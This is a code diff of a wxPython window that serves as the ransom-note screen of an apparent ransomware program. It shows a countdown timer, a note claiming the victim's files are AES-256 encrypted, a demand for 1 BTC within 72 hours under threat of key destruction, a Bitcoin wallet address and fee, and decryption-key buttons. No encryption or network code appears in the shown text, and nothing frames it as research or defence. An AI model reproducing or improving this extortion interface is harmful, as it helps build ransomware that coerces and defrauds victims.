@@ -25,7 +25,7 @@ class MainFrame ( wx.Frame ):
 		
 		MainSizer = wx.BoxSizer( wx.VERTICAL )
 		
-		MainSizer.SetMinSize( wx.Size( 1000,750 ) ) 
+		MainSizer.SetMinSize( wx.Size( 940,710 ) ) 
 		self.HeaderPanel = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
 		HeaderSizer = wx.BoxSizer( wx.VERTICAL )
 		
@@ -47,97 +47,166 @@ class MainFrame ( wx.Frame ):
 		self.HeaderPanel.SetSizer( HeaderSizer )
 		self.HeaderPanel.Layout()
 		HeaderSizer.Fit( self.HeaderPanel )
-		MainSizer.Add( self.HeaderPanel, 0, wx.EXPAND |wx.ALL, 20 )
+		MainSizer.Add( self.HeaderPanel, 0, wx.ALL|wx.EXPAND, 5 )
 		
 		self.BodyPanel = wx.Panel( self, wx.ID_ANY, wx.Point( -1,-1 ), wx.DefaultSize, wx.TAB_TRAVERSAL )
-		BodySizer = wx.BoxSizer( wx.HORIZONTAL )
+		BodySizer = wx.BoxSizer( wx.VERTICAL )
 		
-		self.LockBitmap = wx.StaticBitmap( self.BodyPanel, wx.ID_ANY, wx.NullBitmap, wx.Point( -1,-1 ), wx.DefaultSize, 0 )
-		BodySizer.Add( self.LockBitmap, 3, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 7 )
+		bSizer15 = wx.BoxSizer( wx.HORIZONTAL )
+		
+		bSizer17 = wx.BoxSizer( wx.HORIZONTAL )
+		
+		bSizer20 = wx.BoxSizer( wx.VERTICAL )
+		
+		self.m_panel81 = wx.Panel( self.BodyPanel, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
+		bSizer192 = wx.BoxSizer( wx.VERTICAL )
+		
+		self.LockBitmap = wx.StaticBitmap( self.m_panel81, wx.ID_ANY, wx.Bitmap( u"../build/Resources/new_lock.bmp", wx.BITMAP_TYPE_ANY ), wx.Point( -1,-1 ), wx.DefaultSize, 0 )
+		bSizer192.Add( self.LockBitmap, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 7 )
+		
+		
+		self.m_panel81.SetSizer( bSizer192 )
+		self.m_panel81.Layout()
+		bSizer192.Fit( self.m_panel81 )
+		bSizer20.Add( self.m_panel81, 0, wx.EXPAND |wx.ALL, 0 )
+		
+		self.m_panel8 = wx.Panel( self.BodyPanel, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.RAISED_BORDER|wx.TAB_TRAVERSAL )
+		bSizer191 = wx.BoxSizer( wx.VERTICAL )
+		
+		self.TimeRemainingLabel = wx.StaticText( self.m_panel8, wx.ID_ANY, u"TIME REMAINING", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.TimeRemainingLabel.Wrap( -1 )
+		self.TimeRemainingLabel.SetFont( wx.Font( 16, 75, 90, 92, False, "Courier New" ) )
+		self.TimeRemainingLabel.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
+		
+		bSizer191.Add( self.TimeRemainingLabel, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL|wx.ALL, 10 )
+		
+		self.TimeRemainingTime = wx.StaticText( self.m_panel8, wx.ID_ANY, u"00:00:00", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.TimeRemainingTime.Wrap( -1 )
+		self.TimeRemainingTime.SetFont( wx.Font( 16, 75, 90, 92, False, "Courier New" ) )
+		self.TimeRemainingTime.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
+		
+		bSizer191.Add( self.TimeRemainingTime, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL|wx.ALL, 0 )
+		
+		
+		self.m_panel8.SetSizer( bSizer191 )
+		self.m_panel8.Layout()
+		bSizer191.Fit( self.m_panel8 )
+		bSizer20.Add( self.m_panel8, 1, wx.ALL|wx.EXPAND, 5 )
+		
+		
+		bSizer17.Add( bSizer20, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.EXPAND, 5 )
+		
+		bSizer18 = wx.BoxSizer( wx.VERTICAL )
 		
 		self.RansomNoteText = wx.TextCtrl( self.BodyPanel, wx.ID_ANY, u"The important files on your computer have been encrypted with military grade AES-256 bit encryption.\n\nYour documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server.\n\nTo acquire this key, transfer a total of 1 BTC to the Bitcoin wallet address below within 72 hours.\n\nIf you fail to take action within this time window, the decryption key will be destoyed and access to your files will be permanently lost.", wx.DefaultPosition, wx.DefaultSize, wx.TE_MULTILINE|wx.TE_NO_VSCROLL|wx.TE_READONLY )
 		self.RansomNoteText.SetFont( wx.Font( 14, 75, 90, 90, False, "Courier New" ) )
 		
-		BodySizer.Add( self.RansomNoteText, 7, wx.ALL|wx.EXPAND, 10 )
+		bSizer18.Add( self.RansomNoteText, 3, wx.ALL|wx.EXPAND, 7 )
+		
+		
+		bSizer17.Add( bSizer18, 1, wx.EXPAND, 5 )
+		
+		
+		bSizer15.Add( bSizer17, 1, wx.EXPAND, 5 )
+		
+		
+		BodySizer.Add( bSizer15, 1, wx.EXPAND, 5 )
 		
 		
 		self.BodyPanel.SetSizer( BodySizer )
 		self.BodyPanel.Layout()
 		BodySizer.Fit( self.BodyPanel )
-		MainSizer.Add( self.BodyPanel, 2, wx.ALL|wx.EXPAND, 20 )
+		MainSizer.Add( self.BodyPanel, 3, wx.ALL|wx.EXPAND, 20 )
 		
 		self.FooterPanel = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
-		FooterSizer = wx.BoxSizer( wx.VERTICAL )
+		bSizer181 = wx.BoxSizer( wx.HORIZONTAL )
 		
-		bSizer20 = wx.BoxSizer( wx.HORIZONTAL )
+		self.m_panel9 = wx.Panel( self.FooterPanel, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
+		bSizer22 = wx.BoxSizer( wx.VERTICAL )
 		
-		
-		bSizer20.AddSpacer( ( 0, 0), 2, wx.EXPAND, 5 )
-		
-		self.KeyDestructionLabel = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"KEY DESTRUCTION IN:", wx.DefaultPosition, wx.DefaultSize, 0 )
-		self.KeyDestructionLabel.Wrap( -1 )
-		self.KeyDestructionLabel.SetFont( wx.Font( 16, 75, 90, 92, False, "Courier New" ) )
-		self.KeyDestructionLabel.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
-		
-		bSizer20.Add( self.KeyDestructionLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
-		
-		self.KeyDestructionTime = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"00:00:00", wx.DefaultPosition, wx.DefaultSize, 0 )
-		self.KeyDestructionTime.Wrap( -1 )
-		self.KeyDestructionTime.SetFont( wx.Font( 16, 75, 90, 92, True, "Courier New" ) )
-		self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
-		
-		bSizer20.Add( self.KeyDestructionTime, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
+		self.BitcoinButton = wx.BitmapButton( self.m_panel9, wx.ID_ANY, wx.Bitmap( u"../../../Users/Administrator/Desktop/baccepted.bmp", wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, wx.BU_AUTODRAW )
+		bSizer22.Add( self.BitcoinButton, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )
 		
 		
-		bSizer20.AddSpacer( ( 0, 0), 2, wx.EXPAND, 5 )
+		self.m_panel9.SetSizer( bSizer22 )
+		self.m_panel9.Layout()
+		bSizer22.Fit( self.m_panel9 )
+		bSizer181.Add( self.m_panel9, 1, wx.EXPAND |wx.ALL, 5 )
 		
+		sbSizer2 = wx.StaticBoxSizer( wx.StaticBox( self.FooterPanel, wx.ID_ANY, wx.EmptyString ), wx.VERTICAL )
 		
-		FooterSizer.Add( bSizer20, 1, wx.EXPAND, 5 )
+		self.m_panel10 = wx.Panel( sbSizer2.GetStaticBox(), wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
+		bSizer221 = wx.BoxSizer( wx.VERTICAL )
 		
-		bSizer21 = wx.BoxSizer( wx.HORIZONTAL )
+		bSizer13 = wx.BoxSizer( wx.HORIZONTAL )
 		
-		
-		bSizer21.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
-		
-		self.WalletAddressLabel = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"WALLET ADDRESS:", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.WalletAddressLabel = wx.StaticText( self.m_panel10, wx.ID_ANY, u"WALLET ADDRESS:", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.WalletAddressLabel.Wrap( -1 )
-		self.WalletAddressLabel.SetFont( wx.Font( 16, 75, 90, 92, False, "Courier New" ) )
+		self.WalletAddressLabel.SetFont( wx.Font( 12, 75, 90, 92, False, "Courier New" ) )
 		self.WalletAddressLabel.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
 		
-		bSizer21.Add( self.WalletAddressLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
+		bSizer13.Add( self.WalletAddressLabel, 1, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
 		
-		self.WalletAddressString = wx.StaticText( self.FooterPanel, wx.ID_ANY, u"1BoatSLRHtKNngkdXEeobR76b53LETtpyT", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.WalletAddressString = wx.StaticText( self.m_panel10, wx.ID_ANY, u"1BoatSLRHtKNngkdXEeobR76b53LETtpyT", wx.DefaultPosition, wx.DefaultSize, 0 )
 		self.WalletAddressString.Wrap( -1 )
-		self.WalletAddressString.SetFont( wx.Font( 16, 75, 90, 92, True, "Courier New" ) )
+		self.WalletAddressString.SetFont( wx.Font( 12, 75, 90, 92, False, "Courier New" ) )
 		self.WalletAddressString.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
 		
-		bSizer21.Add( self.WalletAddressString, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
+		bSizer13.Add( self.WalletAddressString, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
 		
 		
-		bSizer21.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+		bSizer221.Add( bSizer13, 0, wx.EXPAND, 5 )
+		
+		bSizer14 = wx.BoxSizer( wx.HORIZONTAL )
+		
+		self.BitcoinFeeLabel = wx.StaticText( self.m_panel10, wx.ID_ANY, u"BITCOIN FEE", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.BitcoinFeeLabel.Wrap( -1 )
+		self.BitcoinFeeLabel.SetFont( wx.Font( 12, 75, 90, 92, False, "Courier New" ) )
+		self.BitcoinFeeLabel.SetForegroundColour( wx.Colour( 255, 255, 0 ) )
+		
+		bSizer14.Add( self.BitcoinFeeLabel, 1, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
+		
+		self.BitcoinFeeString = wx.StaticText( self.m_panel10, wx.ID_ANY, u"1.50", wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.BitcoinFeeString.Wrap( -1 )
+		self.BitcoinFeeString.SetFont( wx.Font( 12, 75, 90, 92, False, "Courier New" ) )
+		self.BitcoinFeeString.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNHIGHLIGHT ) )
+		
+		bSizer14.Add( self.BitcoinFeeString, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL, 5 )
 		
 		
-		FooterSizer.Add( bSizer21, 1, wx.EXPAND, 5 )
+		bSizer221.Add( bSizer14, 0, wx.EXPAND, 5 )
 		
-		bSizer211 = wx.BoxSizer( wx.HORIZONTAL )
-		
-		self.ViewEncryptedFilesButton = wx.Button( self.FooterPanel, wx.ID_ANY, u"View Encrypted Files", wx.DefaultPosition, wx.DefaultSize, 0 )
-		bSizer211.Add( self.ViewEncryptedFilesButton, 0, wx.ALL|wx.EXPAND, 5 )
+		bSizer19 = wx.BoxSizer( wx.HORIZONTAL )
 		
 		
-		bSizer211.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
-		
-		self.EnterDecryptionKeyButton = wx.Button( self.FooterPanel, wx.ID_ANY, u"Enter Decryption Key", wx.DefaultPosition, wx.DefaultSize, 0 )
-		bSizer211.Add( self.EnterDecryptionKeyButton, 0, wx.ALL|wx.EXPAND, 5 )
+		bSizer19.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		
-		FooterSizer.Add( bSizer211, 1, wx.EXPAND, 0 )
+		bSizer19.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
+		
+		self.ViewEncryptedFilesButton = wx.Button( self.m_panel10, wx.ID_ANY, u"View Encrypted Files", wx.DefaultPosition, wx.DefaultSize, 0 )
+		bSizer19.Add( self.ViewEncryptedFilesButton, 1, wx.ALL|wx.EXPAND, 5 )
+		
+		self.EnterDecryptionKeyButton = wx.Button( self.m_panel10, wx.ID_ANY, u"Enter Decryption Key", wx.DefaultPosition, wx.DefaultSize, 0 )
+		bSizer19.Add( self.EnterDecryptionKeyButton, 1, wx.ALL|wx.EXPAND, 5 )
 		
 		
-		self.FooterPanel.SetSizer( FooterSizer )
+		bSizer221.Add( bSizer19, 1, wx.ALIGN_RIGHT|wx.EXPAND, 5 )
+		
+		
+		self.m_panel10.SetSizer( bSizer221 )
+		self.m_panel10.Layout()
+		bSizer221.Fit( self.m_panel10 )
+		sbSizer2.Add( self.m_panel10, 1, wx.ALL|wx.EXPAND, 5 )
+		
+		
+		bSizer181.Add( sbSizer2, 3, wx.EXPAND, 5 )
+		
+		
+		self.FooterPanel.SetSizer( bSizer181 )
 		self.FooterPanel.Layout()
-		FooterSizer.Fit( self.FooterPanel )
-		MainSizer.Add( self.FooterPanel, 1, wx.ALL|wx.EXPAND, 5 )
+		bSizer181.Fit( self.FooterPanel )
+		MainSizer.Add( self.FooterPanel, 1, wx.ALL|wx.EXPAND, 7 )
 		
 		
 		self.SetSizer( MainSizer )
